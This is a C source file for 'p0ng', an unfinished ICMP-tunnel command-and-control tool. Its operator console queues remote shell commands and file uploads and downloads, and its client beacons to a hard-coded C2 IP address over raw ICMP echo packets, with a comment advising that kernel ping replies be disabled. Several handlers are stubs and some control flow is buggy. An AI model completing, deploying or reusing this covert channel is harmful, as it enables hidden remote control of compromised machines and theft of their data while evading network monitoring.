//只有当ICMPheader内ID匹配且ICMP-DATA域完全一致才能判别两包由关联。
//echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <time.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>

#define PACKET_SIZE             4096
#define IPHDR_DEFAULT_LEN       20
#define ICMPHDR_LEN             8
#define ICMP_TIMESTAMP_LEN      8
#define ICMP_DATA_PRESERVE      8
#define ICMP_DATA_DEFAULT_LEN   48
#define ICMP_DATA_LEN           48

#define ICMP_REGULAR            0
#define ICMP_TASK_QUERY         1
#define ICMP_NO_TASK            1
#define ICMP_SHELLCMD           2
#define ICMP_SHELLCMD_RESULT    3
#define ICMP_UPLOAD             4
#define ICMP_UPLOAD_RESULT      5
#define ICMP_DOWNLOAD           6
#define ICMP_DOWNLOAD_QUERY     7

#define USLEEP_TIME             400

uint8_t current_work[ICMP_DATA_LEN-ICMP_DATA_PRESERVE];
uint8_t debug=1,verbose=1;
struct sockaddr_in dest_addr;
uint8_t sockfd;
uint16_t pid; 
struct timeval timeval_new={5,0};
    
unsigned short cal_chksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;
    /*把ICMP报头二进制数据以2字节为单位累加起来*/
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    /*若ICMP报头为奇数个字节，会剩下最后一字节。把最后一个字节视为一个2字节数据的高字节，这个2字节数据的低字节为0，继续累加*/
    if (nleft == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *) w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}


void print_usage(){
    printf("[shell    *] : execute linux shell command on the remote device.\n");
    printf("[upload   *] : upload file to the p0ng-server.\n");
    printf("[download *] : download file from the p0ng-server.\n");
    printf("[reset     ] : manual reset current work immediately.\n");
    //@todo
    //printf("[sessions     ] : show current alive hosts\n");
    printf("[help      ] : show these help message.\n");
}

void print_logo(){
    printf("       _                                     \n");
    printf(" _ __ (_)_ __   __ _ _ __   ___  _ __   __ _ \n");
    printf("| '_ \\| | '_ \\ / _` | '_ \\ / _ \\| '_ \\ / _` |\n");
    printf("| |_) | | | | | (_| | |_) | (_) | | | | (_| |\n");
    printf("| .__/|_|_| |_|\\__, | .__/ \\___/|_| |_|\\__, |\n");
    printf("|_|            |___/|_|                |___/ \n");
    printf("                                   @aplyc1a  \n");
}

void set_current_work(uint8_t work_type,uint8_t *data, uint8_t data_length) {
    (void)snprintf(current_work, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",work_type, 0, 0, data_length, data);
}

void reset_current_work(){
    (void)snprintf(current_work, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_NO_TASK, 0, 0, 0, "");
}

uint8_t p0ng_pack(uint8_t *sendpacket, uint8_t pack_no, uint8_t icmp_type, uint8_t *buf, uint8_t len) {
    uint8_t pack_size;
    struct icmp *icmp;
    struct timeval *tval;
    icmp = (struct icmp*) sendpacket;
    icmp->icmp_type = icmp_type;
    icmp->icmp_code = 0;
    icmp->icmp_cksum = 0;
    icmp->icmp_seq = pack_no;
    icmp->icmp_id = pid;
    pack_size = ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN;
    tval = (struct timeval *) icmp->icmp_data;
    gettimeofday(tval, NULL);
    memcpy(sendpacket+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN , buf, len);
    icmp->icmp_cksum = cal_chksum((uint16_t *) icmp, pack_size);
    return pack_size;
}

uint8_t p0ng_check_recvdpkt(uint8_t *recvpacket, uint8_t recv_pkt_size, uint8_t *sendpacket, uint8_t sendpacket_size) {
    uint8_t iphdrlen;
    struct ip *st_ip;
    struct icmp *st_icmp;
    st_ip = (struct ip *) recvpacket;
    iphdrlen = st_ip->ip_hl << 2; /*ip报头的长度标志乘4求得ip报头长度*/
    st_icmp = (struct icmp *) (recvpacket + iphdrlen); /*越过ip报头,指向ICMP报头*/
    recv_pkt_size -= iphdrlen; /*ICMP报头及ICMP数据报的总长度*/
    if (recv_pkt_size < 8) /*小于ICMP报头长度则不合理*/
    {
        printf("\033[40;33m[!]\033[0mICMP packet length too short!\n");
        return 1;
    }
    if (st_icmp->icmp_type == ICMP_ECHOREPLY) {
        if (st_icmp->icmp_id != pid){
            if(verbose||debug) printf("\r\033[Kst_icmp->icmp_id:%u -- pid:(%u)\n",st_icmp->icmp_id,pid);
            return 1;
        }
            
        if (memcmp(recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,sendpacket+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,ICMP_DATA_PRESERVE)!=0) {
            if(verbose||debug) printf("\r\033[KCheck ICMP_DATA_PRESERVE failure!\n");
            return 1;
        }    
    }
    
    if (st_icmp->icmp_type == ICMP_ECHO) {
        if(verbose||debug) printf("\r\033[KRecved ICMPECHO!\n");
        return 1;
    }
    return 0;
}

uint8_t check_server(uint8_t seq_num){
    uint8_t sendpacket[PACKET_SIZE];
    uint8_t recvpacket[PACKET_SIZE];
    uint8_t sendpacket_size;
    int8_t recv_pkt_size;
    uint8_t icmpdata[48]={0};
    uint8_t icmp_data_prefix[8]={0};
    uint8_t icmp_data_len=0;
    uint8_t count=0;
    uint16_t length=0;
    struct timeval timeval_old;
    srand(time(0));
    
    while(count<3){//一般来说data域前三字节不为空
        icmp_data_prefix[count]=rand()%255;
        count++;
    }
    memcpy(icmpdata,icmp_data_prefix,8);
    (void)snprintf(current_work, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_REGULAR, 0, 0, 0, "");//实际上就是正常的ping请求    
    memcpy(icmpdata+8,current_work,sizeof(current_work));
    icmp_data_len=ICMP_DATA_PRESERVE+sizeof(current_work);
    
    sendpacket_size = p0ng_pack(sendpacket,seq_num,ICMP_ECHO,icmpdata,icmp_data_len);//@todo 后期考虑怎么加密payload
    if(sendto(sockfd, sendpacket, sendpacket_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
        return 1;
    }
    //signal(SIGALRM, handler);
    //alarm( 5 ); 
    getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
    recv_pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);//默认等3秒
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
    if (recv_pkt_size==-1) {
        if (verbose||debug) printf("Connect timeout!\n");
        return 1;
    }
    return p0ng_check_recvdpkt(recvpacket, recv_pkt_size, sendpacket, sendpacket_size);

}

void regular_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
    uint8_t sendpkt[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
    struct icmp *recv_icmp, *send_icmp;
    unsigned long inaddr = 0l;
    struct ip *recv_ip;
    uint8_t iphdrlen;    
    recv_ip = (struct ip *) recvpkt;
    iphdrlen = (recv_ip->ip_hl)*4; /*ip报头的长度标志乘4求得ip报头长度*/
    recv_icmp = (struct icmp *) (recvpkt + iphdrlen); /*越过ip报头,指向ICMP报头*/
//拼包开始
    //ICMP头拼包
    send_icmp = (struct icmp*)sendpkt;
    memcpy(sendpkt,recvpkt+20,ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN);
    send_icmp->icmp_type = ICMP_ECHOREPLY;
    send_icmp->icmp_code = recv_icmp->icmp_code;
    send_icmp->icmp_cksum = 0;
    send_icmp->icmp_seq = recv_icmp->icmp_seq;
    send_icmp->icmp_id = recv_icmp->icmp_id;
    //ICMP头校验
    send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN); /*校验算法*/
    //修改回包IP
    inaddr = inet_addr(inet_ntoa(recv_ip->ip_src));
    memcpy((char *) &dest_addr.sin_addr, (char*)&inaddr,sizeof(inaddr));

    sendto(sockfd, sendpkt, ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
}

void p0ng_client(char *server_ip){
    struct hostent *host;
    struct protoent *protocol;
    unsigned long inaddr = 0l;
    uint32_t size = 50 * 1024;
    uint16_t count = 1;
    if ((protocol = getprotobyname("icmp")) == NULL)
    {
        perror("getprotobyname error");
        exit(1);
    }
    /*生成使用ICMP的原始套接字*/
    if ((sockfd = socket(AF_INET, SOCK_RAW, protocol->p_proto)) < 0) /*函数socket()在<sys/socket.h>中定义，int socket(int domain, int type, int protocol);*/
    {
        perror("socket error");
        exit(1);
    }
    setuid(getuid());
    setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &size, sizeof(size));
    bzero(&dest_addr, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    /*判断是主机名还是ip地址*/
    if ((inaddr = inet_addr(server_ip)) == INADDR_NONE)
    {
        if ((host = gethostbyname(server_ip)) == NULL) {//注意这里的括号，反复错了多次。
            perror("gethostbyname error");
            exit(1);
        }
        /*是主机名*/
        memcpy((char *) &dest_addr.sin_addr, host->h_addr, host->h_length);
    } else {
        /*是IP地址*/
        memcpy((char *) &dest_addr.sin_addr, (char*)&inaddr,sizeof(inaddr));
    }
    /*设置ICMP的标志符*/
    pid = getpid();
    if(check_server(count)){
        printf("\033[40;31m[-]\033[0mTarget(%s) unreachable!\n", server_ip);
        exit(0);
    }


}

void p0ng_server(){
    struct protoent *protocol;
    uint8_t iphdr_len = 0;
    uint8_t icmptotal_len= 0;
    uint8_t recvpacket[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];
    struct ip *st_ip;
    uint8_t ip_src[20]={0},ip_dst[20]={0};
    uint8_t pkt_type=0;    
    uint8_t pkt_size=0;    
    uint32_t icmp_buf_size = 50 * 1024;
    
    if ((protocol = getprotobyname("icmp")) == NULL)
    {
        perror("getprotobyname error");
        exit(1);
    }

    if ((sockfd = socket(AF_INET, SOCK_RAW, protocol->p_proto)) < 0)
    {
        perror("socket error");
        exit(1);
    }
    setuid(getuid());
    setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &icmp_buf_size, sizeof(icmp_buf_size));
    pid = getpid();
    
    while(1){
        pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);
        st_ip = (struct ip *) recvpacket;
        strcpy(ip_src,inet_ntoa(st_ip->ip_src));
        strcpy(ip_dst,inet_ntoa(st_ip->ip_dst));
        if(verbose||debug) printf("\r\033[K\033[40;34m[@]\033[0m %s --> %s %dbytes\n", ip_src, ip_dst, pkt_size);
        iphdr_len = st_ip->ip_hl << 2;
        icmptotal_len = pkt_size - iphdr_len;
        if( icmptotal_len < 8){
            printf("\033[40;31m[-]\033[0mMalformed Message!\n");
            return;
        }
        else
            pkt_type=recvpacket[iphdr_len+16+8];
        switch(pkt_type)
        {
            case ICMP_TASK_QUERY://处理客户端发来的任务请求，返回当前任务信息
			    if(verbose||debug) printf("\r\033[Kstub task query!\n");
				//current_task_responcer(recvpacket, pkt_size);//basic icmp-pktcheck
            case ICMP_SHELLCMD_RESULT ://处理客户端发来的shell命令执行结果。
                if(verbose||debug) printf("\r\033[Kstub execute!\n");
                //execute_responcer(recvpacket, pkt_size);
                break;
            case ICMP_UPLOAD_RESULT ://处理客户端发来的文件上传数据。
                if(verbose||debug) printf("\r\033[Kstub upload!\n");
                //upload_responcer(recvpacket, pkt_size);
                break;
            case ICMP_DOWNLOAD_QUERY ://处理客户端发来的文件下载请求，并返回文件数据。
                if(verbose||debug) printf("\r\033[Kstub download!\n");
                //download_responcer(recvpacket, pkt_size);
                break;
            //@todo delete such case later
            case ICMP_SHELLCMD :
            case ICMP_UPLOAD :
            case ICMP_DOWNLOAD :
                printf("\r\033[K\033[40;31m[-]\033[0mOooops.Received wrong type packet\n");
            default ://处理正常的ICMP报文及其他情况。按照正常的ICMP响应来构造。
                if(verbose||debug) printf("\r\033[KEntering func: regular_responcer.\n");
                regular_responcer(recvpacket, pkt_size);
				if(verbose||debug) printf("\r\033[KExit func: regular_responcer.\n");
                
        }
        reset_current_work();
        //@todo  check if the peer is dead. 
        //update_heartbeats_db(client_ip);
    } 
}

void p0ng_c2_main(){
    char p0ngcmd[100];
    int status=0;
    pthread_t socket_thread;
    char ch;
    print_logo();
    //创建socket线程处理客户端回连过来的ICMP流。
    pthread_create(&socket_thread,NULL,p0ng_server,NULL);
    //pthread_join(socket_thread,NULL); //该函数用于阻塞等待线程结束
    while(1){
        printf("\033[40;32mp0ng$>\033[0m");
        memset(p0ngcmd,0,100);        
        fgets(p0ngcmd,ICMP_DATA_LEN-ICMP_DATA_PRESERVE,stdin);//fgets会存储换行符
        setbuf(stdin,NULL);//@todo 想处理输入过长字符串导致的缓冲区残留问题，但是发现好像不起作用。
        //p0ngcmd[sizeof(p0ngcmd)-1]='\0';//如果后期更改了ICMP_DATA_LEN，这里可以做溢出保护。

        //注意下面是根据输入设置当前的任务信息，存储在current_work中。client获取current_work后，server会重置当前任务。
        if(strncmp(p0ngcmd,"shell ",6) == 0){
            set_current_work(ICMP_SHELLCMD, p0ngcmd+6, strlen(p0ngcmd+6));
        } else if (strncmp(p0ngcmd,"upload ",7) == 0){
            set_current_work(ICMP_UPLOAD, p0ngcmd+7, strlen(p0ngcmd+7));
        } else if (strncmp(p0ngcmd,"download ",9) == 0){
            set_current_work(ICMP_DOWNLOAD, p0ngcmd+9, strlen(p0ngcmd+9));
        } else if ((strcmp(p0ngcmd,"help\n") == 0)){
            print_usage();
        } else if (strcmp(p0ngcmd,"\n") ==0){
            continue;
        } else if(strcmp(p0ngcmd,"reset\n") ==0) {//9
            reset_current_work();
        } else {
            printf("\033[40;33m[!]\033[0munknow command! %3s..\n",p0ngcmd);
        }
        printf("Oooops\n");
    }    
    
    
}

int main(int argc, char *argv[]){
    //p0ng-reverse
    //server: p0ng -S
    //client: p0ng -C -s SIP

    int32_t opt=0;
    uint8_t server_ip[16]="192.168.199.202";
    uint8_t btn_s=0;
    uint8_t btn_c=0;
    while((opt=getopt(argc,argv,"SChqs:"))!=-1)
    {
        switch(opt)
        {
            case 'h':
                printf("stub for show help!\n");
                printf("-C client-mode\n");
                printf("-S Server-mode\n");
                printf("-s [IP] configure c2-server address\n");
                printf("-h show usage\n");
            case 'q':
                debug=0;
                verbose=0;
            case 'C':
                btn_s=0;
                btn_c=1;
                break;
            case 's':
                strcpy(server_ip,optarg);
                break;
            case 'S':
            default:
                btn_s=1;
                btn_c=0;
                
        }
    }
    if((btn_s^btn_c)==0){
        exit(0);
    }
    if(btn_s){
        //p0ng_server();
        p0ng_c2_main();
    }
    if(btn_c){
        printf("[+]waiting for connection...\n");
        p0ng_client(server_ip);
    }

    return 0;
}
